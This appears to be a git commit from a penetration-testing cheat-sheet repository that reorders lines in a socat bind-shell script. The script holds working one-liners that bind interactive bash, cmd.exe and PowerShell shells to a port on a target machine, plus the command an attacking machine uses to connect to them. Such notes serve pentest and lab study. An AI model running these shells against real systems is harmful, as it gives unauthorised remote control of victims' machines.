e9092d0372fd76615561d5281c2e581e4cc4dd13
gabyorel <gabyorel@hotmail.fr>
2023-10-25 13:56:35 +0200

    fix: move lines location

--- shells/basic/socat-bind.sh
+++ shells/basic/socat-bind.sh
@@ -1,8 +1,8 @@
 # setup a listener on the target machine
 socat tcp-l:80 exec:"bash -li"
-
-# connect to the listener from the attacking machine
-socat tcp:10.10.10.20:80 -
 # use the pipes argument to interface between the unix and windows ways of handling input and output
 socat tcp-l:80 exec:cmd.exe,pipes
 socat tcp-l:80 exec:powershell.exe,pipes
+
+# connect to the listener from the attacking machine
+socat tcp:10.10.10.20:80 -
